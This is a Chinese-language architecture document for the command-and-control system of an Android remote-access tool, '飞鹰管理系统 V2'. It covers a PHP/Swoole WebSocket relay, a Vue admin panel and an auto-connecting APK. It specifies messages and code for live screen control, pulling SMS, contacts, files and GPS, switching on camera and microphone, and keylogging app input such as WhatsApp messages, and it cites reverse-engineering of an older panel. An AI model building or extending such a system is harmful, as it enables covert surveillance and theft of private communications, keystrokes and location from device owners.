# WebSocket 系统架构文档

飞鹰管理系统 V2 WebSocket 实时通信架构详解。

## 系统总览

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                              WebSocket 通信架构                                   │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│   ┌─────────────────┐                                   ┌─────────────────┐     │
│   │   Android 设备   │                                   │   Web 管理面板   │     │
│   │   (被控端 APK)   │                                   │   (Vue 3 前端)   │     │
│   │                 │                                   │                 │     │
│   │ itype=Slr_client│                                   │ itype=slr_panel │     │
│   └────────┬────────┘                                   └────────┬────────┘     │
│            │                                                     │              │
│            │              ┌─────────────────────┐                │              │
│            │              │   Swoole WebSocket  │                │              │
│            └─────────────►│      Server         │◄───────────────┘              │
│                           │   (PHP 8.5)         │                               │
│                           │   Port: 8081        │                               │
│                           └─────────────────────┘                               │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

## 三端角色说明

### 1. Android 设备端 (被控端)

| 属性 | 说明 |
|------|------|
| 标识 | `itype: 'Slr_client'` |
| 功能 | 被控设备，执行远程命令，上报数据 |
| 连接时机 | APK 安装后自动连接 |
| 心跳 | 定期发送 ping，上报设备状态 |

**主要消息类型：**

| subc | 方向 | 说明 |
|------|------|------|
| `ping` | 设备→服务器 | 心跳，携带设备状态信息 |
| `screen` | 设备→服务器 | 屏幕截图数据 |
| `sms` | 设备→服务器 | 短信列表 |
| `files` | 设备→服务器 | 文件列表 |
| `loc` | 设备→服务器 | GPS 位置 |
| `cam` | 设备→服务器 | 摄像头画面 |
| `mic` | 设备→服务器 | 麦克风音频 |

### 2. Web 管理面板 (控制端)

| 属性 | 说明 |
|------|------|
| 标识 | `itype: 'slr_panel'` 或 `itype: 'slr_panelsend'` |
| 功能 | 管理员界面，查看设备列表，远程控制设备 |
| 连接时机 | 用户登录后自动连接 |
| 心跳 | 每 5 秒发送 checkphone 刷新设备列表 |

**主要消息类型：**

| subc | itype | 说明 |
|------|-------|------|
| `checkphone` | - | 查询设备列表 |
| `join` | slr_panel | 订阅某设备的数据 |
| `ping` | slr_panel | 查询设备状态 |
| `out` | slr_panel | 退出设备控制 |
| `screen` | slr_panel | 屏幕控制命令 |
| `SMS` | slr_panelsend | 获取短信 |
| `files` | slr_panelsend | 获取文件列表 |
| `cam` | slr_panelsend | 开启摄像头 |

### 3. Swoole WebSocket 服务器 (中转站)

| 属性 | 说明 |
|------|------|
| 技术栈 | PHP 8.5 + Swoole 6.x |
| 端口 | 8081 |
| 功能 | 消息路由、连接管理、状态维护 |

**核心职责：**

1. **连接管理** - 维护设备和面板的连接映射
2. **消息路由** - 根据 itype 分发到对应 Handler
3. **状态同步** - 设备状态存储到 Redis
4. **心跳检测** - 超时断开无响应连接

---

## 数据流详解

### 场景 1: 设备列表实时更新 (推送模式)

> **重要**: 系统采用推送模式，Panel 只需首次调用 `checkphone` 获取完整列表，之后通过推送消息实时更新状态，无需轮询。

```
┌──────────┐         ┌──────────┐         ┌──────────┐
│  Web 端   │         │  Server  │         │  设备端   │
└────┬─────┘         └────┬─────┘         └────┬─────┘
     │                    │                    │
     │  1. checkphone     │                    │
     │   (仅首次)         │                    │
     │───────────────────►│                    │
     │                    │                    │
     │  2. 注册 Panel     │                    │
     │     订阅           │                    │
     │                    │                    │
     │  3. 设备列表响应    │                    │
     │◄───────────────────│                    │
     │                    │                    │
     │                    │  4. 新设备上线     │
     │                    │◄───────────────────│
     │                    │                    │
     │  5. deviceOnline   │                    │
     │     推送           │                    │
     │◄───────────────────│                    │
     │                    │                    │
     │                    │  6. 设备离线       │
     │                    │◄───────────────────│
     │                    │                    │
     │  7. deviceOffline  │                    │
     │     推送           │                    │
     │◄───────────────────│                    │
```

**推送模式优势：**
- 无需每秒轮询 `checkphone`，减少服务器压力
- 实时性更高，设备状态变化立即推送
- 用户隔离：普通用户只收到自己设备的推送，管理员收到所有推送

### 场景 2: 远程屏幕控制

```
┌──────────┐         ┌──────────┐         ┌──────────┐
│  Web 端   │         │  Server  │         │  设备端   │
└────┬─────┘         └────┬─────┘         └────┬─────┘
     │                    │                    │
     │  1. join (订阅设备) │                    │
     │───────────────────►│                    │
     │                    │                    │
     │  2. joinResponse   │                    │
     │◄───────────────────│                    │
     │                    │                    │
     │  3. 开启屏幕共享    │                    │
     │───────────────────►│  4. 转发命令       │
     │                    │───────────────────►│
     │                    │                    │
     │                    │  5. 屏幕数据       │
     │  6. 屏幕数据       │◄───────────────────│
     │◄───────────────────│                    │
     │                    │                    │
     │  7. 点击 (x, y)    │                    │
     │───────────────────►│  8. 转发点击       │
     │                    │───────────────────►│
     │                    │                    │
     │                    │  9. 执行点击       │
     │                    │                    │
```

### 场景 3: 获取设备数据 (短信/联系人等)

```
┌──────────┐         ┌──────────┐         ┌──────────┐
│  Web 端   │         │  Server  │         │  设备端   │
└────┬─────┘         └────┬─────┘         └────┬─────┘
     │                    │                    │
     │  1. SMS 请求       │                    │
     │  (slr_panelsend)   │  2. 转发请求       │
     │───────────────────►│───────────────────►│
     │                    │                    │
     │                    │  3. 读取短信       │
     │                    │                    │
     │                    │  4. 短信数据       │
     │  5. 短信数据       │◄───────────────────│
     │◄───────────────────│                    │
```

### 场景 4: 键盘监听控制

> **重要**: 键盘记录数据存储在**设备端**，服务器仅做转发，不存储键盘数据。

```
┌──────────┐         ┌──────────┐         ┌──────────┐
│  Web 端   │         │  Server  │         │  设备端   │
└────┬─────┘         └────┬─────┘         └────┬─────┘
     │                    │                    │
     │  1. 开启监听       │                    │
     │  keylogtype='1'    │  2. 转发命令       │
     │───────────────────►│───────────────────►│
     │                    │                    │
     │                    │  3. 设备开始记录   │
     │                    │     键盘输入       │
     │                    │                    │
     │  4. 请求记录       │                    │
     │  (刷新/按日期)     │  5. 转发请求       │
     │───────────────────►│───────────────────►│
     │                    │                    │
     │                    │  6. 设备本地查询   │
     │                    │                    │
     │                    │  7. 返回记录       │
     │  8. 键盘记录       │◄───────────────────│
     │◄───────────────────│                    │
     │                    │                    │
     │  9. 关闭监听       │                    │
     │  keylogtype='0'    │  10. 转发命令      │
     │───────────────────►│───────────────────►│
     │                    │                    │
     │                    │  11. 设备停止记录  │
```

**键盘监听特点：**
- 数据存储在设备端本地 (SQLite/文件)，服务器不存储
- 支持按日期查询历史记录
- 需要用户手动开启/关闭监听，不会自动启动

---

## 消息协议

### 出站消息 (Web → Server)

#### checkphone (设备列表查询)

```json
{
  "subc": "checkphone",
  "email": "user@example.com",
  "page": 1,
  "pageSize": 100,
  "filters": {}
}
```

#### join (订阅设备)

```json
{
  "itype": "slr_panel",
  "subc": "join",
  "pid": "device-uuid",
  "usercheck": "md5-hash"
}
```

#### 屏幕控制

```json
{
  "itype": "slr_panel",
  "subc": "screen",
  "pid": "device-uuid",
  "comand": "mov",
  "movetype": "0",
  "poi": "500,800"
}
```

#### 数据请求

```json
{
  "itype": "slr_panelsend",
  "subc": "SMS",
  "pid": "device-uuid"
}
```

#### 键盘监听控制

```json
// 开启键盘监听
{
  "itype": "slr_panelsend",
  "subc": "Keylog",
  "pid": "device-uuid",
  "keylogtype": "1"
}

// 关闭键盘监听
{
  "itype": "slr_panelsend",
  "subc": "Keylog",
  "pid": "device-uuid",
  "keylogtype": "0"
}

// 按日期查询键盘记录
{
  "itype": "slr_panelsend",
  "subc": "Logdate",
  "pid": "device-uuid",
  "keylogdate": "2026-02-01"
}
```

### 入站消息 (Server → Web)

#### checkphone 响应

```json
{
  "type": "checkphone",
  "list": [
    {
      "phone_id": "uuid",
      "phone_name": "设备名称",
      "model": "Pixel 8",
      "android_version": "14",
      "battery_charge": "85",
      "country": "China",
      "is_online": true,
      "lastPing": 1706745600
    }
  ],
  "total": 10,
  "page": 1,
  "pageSize": 100
}
```

#### deviceOnline 推送 (新设备上线)

与 deviceUpdate 同构，使用 `phoneInfo` 携带完整信息（formatForPanel 格式）：

```json
{
  "type": "deviceOnline",
  "pid": "device-uuid",
  "phoneInfo": {
    "pid": "device-uuid",
    "phone_name": "新设备",
    "model": "Pixel 9",
    "battery_charge": "95",
    "is_online": true,
    "lastPing": 1738742400000,
    "ip_location": ""
  },
  "stats": { "total": 10, "online": 2, "offline": 8 }
}
```

#### deviceOffline 推送 (设备离线)

```json
{
  "type": "deviceOffline",
  "pid": "device-uuid",
  "phoneInfo": null,
  "stats": { "total": 10, "online": 2, "offline": 8 }
}
```

#### 屏幕数据

```json
{
  "type": "screen",
  "data": "base64-jpeg-data",
  "wmob": 1080,
  "hmob": 1920,
  "pid": "device-uuid"
}
```

#### 设备状态

```json
{
  "type": "statusBatch",
  "pid": "device-uuid",
  "lastPing": "2026-01-31 12:00:00",
  "serverToPhone": "OPEN",
  "phoneInfo": {
    "phone_id": "uuid",
    "phone_name": "设备名称",
    "model": "Pixel 8",
    "battery_charge": "85"
  }
}
```

#### 键盘记录数据

```json
// 键盘记录响应 (type: klog)
{
  "type": "klog",
  "data": "[{\"time\":\"2026-02-01 10:30:15\",\"app\":\"com.whatsapp\",\"action\":\"Hello\",\"status\":\"typed\"}]",
  "pid": "device-uuid"
}

// 按日期查询响应 (type: klogsdate)
{
  "type": "klogsdate",
  "data": "[{\"time\":\"2026-02-01 10:30:15\",\"app\":\"com.whatsapp\",\"action\":\"Hello\",\"status\":\"typed\"}]",
  "pid": "device-uuid"
}
```

**键盘记录数据结构：**

| 字段 | 类型 | 说明 |
|------|------|------|
| `time` | string | 记录时间 |
| `app` | string | 应用包名 |
| `action` | string | 用户输入内容 |
| `status` | string | 状态 (typed/pasted/deleted) |

---

## 前端实现

### 目录结构

```
resources/ts/
├── types/
│   └── websocket.ts              # 消息类型定义
├── composables/
│   ├── useGlobalWebSocket.ts     # 全局连接 (设备列表)
│   ├── useDeviceWebSocket.ts     # 设备控制连接
│   ├── useScreenControl.ts       # 屏幕控制命令
│   └── useDeviceData.ts          # 数据获取
├── Components/DeviceControl/
│   ├── ScreenViewer.vue          # 屏幕显示
│   ├── ControlPanel.vue          # 控制面板
│   ├── MediaPanel.vue            # 摄像头/麦克风
│   ├── DeviceInfo.vue            # 设备信息
│   ├── DeviceActions.vue         # 设备操作
│   └── tabs/
│       ├── SmsTab.vue            # 短信
│       ├── ContactsTab.vue       # 联系人
│       ├── FilesTab.vue          # 文件
│       ├── AppsTab.vue           # 应用
│       ├── KeylogTab.vue         # 键盘记录
│       └── LocationTab.vue       # GPS 定位
├── Layouts/
│   └── AuthenticatedLayout.vue   # 全局 WebSocket 连接
└── Pages/Devices/
    ├── Index.vue                 # 设备列表 (实时更新)
    └── Control.vue               # 远程控制
```

### 两种 WebSocket 连接

| Composable | 用途 | 连接时机 | 更新方式 |
|------------|------|----------|----------|
| `useGlobalWebSocket` | 设备列表实时更新 | 登录后自动连接 | **推送模式** (首次 checkphone + 实时推送) |
| `useDeviceWebSocket` | 单设备远程控制 | 进入控制页面后手动连接 | 30 秒心跳 |

### useGlobalWebSocket (推送模式)

```typescript
import { useGlobalWebSocket } from '@/composables/useGlobalWebSocket';

const {
    connectionState,  // 连接状态
    devices,          // 设备列表 (实时更新)
    totalDevices,     // 设备总数
    refreshDevices,   // 手动刷新
    connect,          // 建立连接
    disconnect,       // 断开连接
} = useGlobalWebSocket();

// 消息处理示例
ws.onmessage = (event) => {
  const msg = JSON.parse(event.data);
  
  switch (msg.type) {
    case 'checkphone':
      // 首次加载完整列表
      devices.value = msg.list;
      break;
      
    case 'deviceOnline':
      // 新设备上线或已有设备重新上线（phoneInfo 与 deviceUpdate 同构，含完整信息）
      const existing = devices.value.find(d => d.uuid === msg.pid);
      if (existing && msg.phoneInfo) {
        Object.assign(existing, msg.phoneInfo);
      } else if (msg.phoneInfo) {
        devices.value.unshift({ uuid: msg.pid, ...msg.phoneInfo });  // 新设备
      }
      break;
      
    case 'deviceOffline':
      // 设备离线
      const device = devices.value.find(d => d.phone_id === msg.pid);
      if (device) {
        device.is_online = false;
      }
      break;
  }
};
```

### useDeviceWebSocket

```typescript
import { useDeviceWebSocket } from '@/composables/useDeviceWebSocket';

const {
    connectionState,
    deviceStatus,
    connect,          // connect(deviceId, usercheck)
    disconnect,
    send,             // 发送消息
    onMessage,        // 监听消息
} = useDeviceWebSocket();
```

---

## 后端实现

### 文件结构

```
app/WebSocket/
├── Server.php                    # Swoole 服务器主类
├── ConnectionManager.php         # 连接管理器
├── MessageRouter.php             # 消息路由
├── Handlers/
│   ├── DeviceHandler.php         # 设备消息处理 (Slr_client)
│   ├── PanelHandler.php          # 面板控制命令 (slr_panel)
│   ├── PanelSendHandler.php      # 面板数据操作 (slr_panelsend)
│   └── CheckPhoneHandler.php     # 设备列表查询
└── Services/
    ├── DeviceStatusService.php   # 设备状态管理
    ├── HeartbeatService.php      # 心跳检测
    └── EncryptionService.php     # AES 加密
```

### 消息路由逻辑

```php
// MessageRouter.php
public function route(int $fd, string $rawData): void
{
    $data = json_decode($rawData, true);
    
    // checkphone 特殊处理
    if ($data['subc'] === 'checkphone') {
        $this->checkPhoneHandler->handle($fd, $data);
        return;
    }
    
    // 根据 itype 分发
    match ($data['itype'] ?? null) {
        'Slr_client' => $this->deviceHandler->handle($fd, $data),
        'slr_panel' => $this->panelHandler->handle($fd, $data),
        'slr_panelsend' => $this->panelSendHandler->handle($fd, $data),
        default => $this->handleUnknown($fd),
    };
}
```

### 连接管理

```php
// ConnectionManager.php
class ConnectionManager
{
    // Swoole\Table 存储
    private Table $deviceConnections;   // phone_id → fd
    private Table $panelConnections;    // fd → phone_id
    private Table $panelSubscriptions;  // phone_id → [fd1, fd2, ...]
    
    // 设备注册
    public function registerDevice(int $fd, string $phoneId): void;
    
    // 面板订阅设备
    public function subscribePanel(int $fd, string $phoneId): void;
    
    // 发送消息给设备
    public function sendToDevice(string $phoneId, array $data): bool;
    
    // 发送消息给订阅的面板
    public function sendToPanels(string $phoneId, array $data): void;
}
```

---

## 启动服务

### 开发环境

```bash
cd app

# 1. 启动 Docker 容器
./vendor/bin/sail up -d

# 2. 启动前端开发服务器 (必须)
./vendor/bin/sail npm run dev

# 3. 启动 WebSocket 服务器
./vendor/bin/sail artisan websocket:serve
```

### 访问地址

| 服务 | 地址 |
|------|------|
| Web 应用 | http://localhost:8899 |
| Vite HMR | http://localhost:5173 |
| WebSocket | ws://localhost:8081 |

### 环境变量

```bash
# .env
VITE_WEBSOCKET_URL=ws://localhost:8081
```

---

## 调试技巧

### 浏览器 Network 面板

1. 打开 DevTools → Network → WS
2. 查看 WebSocket 连接和消息

### 服务器日志

```bash
./vendor/bin/sail logs -f
```

### 常见问题

| 问题 | 原因 | 解决方案 |
|------|------|----------|
| 设备列表不更新 | WebSocket 未连接 | 检查 `connectionState` |
| 连接失败 | 服务器未启动 | 运行 `artisan websocket:serve` |
| 控制无响应 | 设备离线 | 检查设备端连接状态 |

---

## 相关文档

- [WEBSOCKET_SERVER_PHP.md](./WEBSOCKET_SERVER_PHP.md) - 服务器端详细实现
- [DEVELOPMENT.md](./DEVELOPMENT.md) - 开发环境配置
- [../WEBSOCKET_SERVER.md](../WEBSOCKET_SERVER.md) - 原始协议分析
- [../FRONTEND_WEBSOCKET_CLIENT.md](../FRONTEND_WEBSOCKET_CLIENT.md) - 旧前端逆向分析
